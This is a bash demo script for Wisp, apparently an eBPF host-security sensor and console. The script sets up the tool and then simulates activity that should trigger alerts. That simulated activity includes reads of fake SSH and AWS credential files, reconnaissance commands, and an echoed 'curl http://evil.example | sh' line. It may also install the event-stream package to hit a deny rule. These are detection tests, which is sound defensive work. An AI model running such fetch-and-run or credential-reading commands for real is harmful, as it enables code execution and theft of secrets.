#!/usr/bin/env bash
# One-command local demo: build, start the console and a sensor over mutual
# TLS, generate a mix of benign and malicious activity, and leave the web
# console running.
#
#   sudo ./demo.sh            # this host only
#   sudo ./demo.sh --fleet    # plus 20 simulated hosts with a day of history
#
# Then open http://localhost:8080 and sign in with the token printed below.
#
# Everything the demo writes (console state, sensor config, logs, the fake
# credentials it reads) lives in a fresh private directory from mktemp; it
# never writes to /etc/wisp or /var/log/wisp. The demo sensor runs in monitor
# mode and uses the repository's policy files.
set -euo pipefail
cd "$(dirname "$0")"
[[ $EUID -eq 0 ]] || { echo "run as root (the sensor loads an eBPF program)"; exit 1; }
FLEET=0; [[ "${1:-}" == "--fleet" ]] && FLEET=1
STATE=$(mktemp -d "${TMPDIR:-/tmp}/wisp-demo.XXXXXXXX")  # 0700, root-owned, unpredictable

echo "==> building"
make >/dev/null

echo "==> test certificates (pki/, demo only) and an admin API token"
bash bench/mkpki.sh >/dev/null
TOKEN_OUT=$(./console/wisp-console -gen-token admin:demo)
TOKEN=$(sed -n 2p <<<"$TOKEN_OUT" | tr -d ' ')
sed -n 5p <<<"$TOKEN_OUT" | sed 's/^ *//' > "$STATE/roles.conf"


echo "==> starting console on http://localhost:8080"
./console/wisp-console -listen 127.0.0.1:8750 -http 127.0.0.1:8080 \
  -cert pki/console.crt -key pki/console.key -client-ca pki/ca.crt \
  -roles "$STATE/roles.conf" -state-dir "$STATE" >"$STATE/console.log" 2>&1 &
CPID=$!

# The shipped wisp.conf with the repository's policy files, and logs and
# state in $STATE (not the host's /var/log/wisp and /var/lib/wisp).
sed -e "s|/etc/wisp/|$PWD/config/|g" \
    -e "s|^state_dir .*|state_dir = $STATE/state|; s|^log_dir .*|log_dir = $STATE/log|" \
    -e 's/^telemetry = .*/telemetry = 1/; s/^housekeeping = .*/housekeeping = 5/' \
    -e 's/^mode = .*/mode = monitor/' config/wisp.conf > "$STATE/wisp.conf"
mkdir -m 0750 "$STATE/state" "$STATE/log"
cat >> "$STATE/wisp.conf" <<EOF
console = 127.0.0.1:8750
cert = $PWD/pki/agent.crt
key = $PWD/pki/agent.key
ca = $PWD/pki/ca.crt
group = demo
EOF

echo "==> starting sensor (monitor mode)"
./agent/wispd -c "$STATE/wisp.conf" 2>"$STATE/wispd.log" &
WPID=$!
SPID=
if [[ $FLEET -eq 1 ]]; then
	echo "==> connecting 20 simulated hosts"
	python3 bench/demo_fleet.py --seconds 86400 >"$STATE/fleet.log" 2>&1 &
	SPID=$!
fi
trap 'kill $CPID $WPID $SPID 2>/dev/null' EXIT
sleep 1.5

echo "==> simulating activity (benign + malicious)"
ACT="$STATE/activity"   # inside the private mktemp directory
mkdir -p "$ACT/.ssh" "$ACT/.aws"
echo privkey > "$ACT/.ssh/id_rsa"; echo awscreds > "$ACT/.aws/credentials"
cat "$ACT/.ssh/id_rsa" >/dev/null          # CRED-001
cat "$ACT/.aws/credentials" >/dev/null     # CRED-002
whoami >/dev/null; id >/dev/null; hostname >/dev/null  # LOL-003
bash -c 'echo "curl http://evil.example | sh"' >/dev/null   # RSHELL-02
if command -v npm >/dev/null; then
	npm install event-stream --no-audit --no-fund >/dev/null 2>&1 || true  # CAT-NPM deny
	npm rm event-stream >/dev/null 2>&1 || true
fi

cat <<EOF

================================================================
 Wisp is running.   Open  http://localhost:8080
 Sign in with this admin token (shown once):

   $TOKEN

 State, logs and the event journal: $STATE
 (sensor alerts: $STATE/log/alerts.jsonl; remove the directory when done)
 Ctrl-C to stop.
================================================================
EOF
wait
